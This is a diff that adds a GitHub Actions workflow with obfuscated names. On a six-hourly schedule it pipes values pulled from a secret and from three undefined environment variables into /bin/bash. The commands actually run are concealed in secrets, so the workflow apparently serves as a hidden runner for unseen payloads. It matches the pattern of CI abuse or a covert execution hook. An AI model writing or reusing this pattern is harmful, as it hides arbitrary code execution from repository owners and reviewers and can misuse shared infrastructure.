@@ -1,0 +1,20 @@
+name: fukanxxo
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fukanxxo
+        env:
+          wwvom2: ${{ secrets.wwvom2 }}
+        run: |
+          echo $wwvom2 | jq -r .u81 | /bin/bash
+          echo $jhau092 | jq -r .iomb8 | /bin/bash
+          echo $i8051 | jq -r .llyb89582 | /bin/bash
+          echo $erj4 | jq -r .tnucm5 | /bin/bash
+
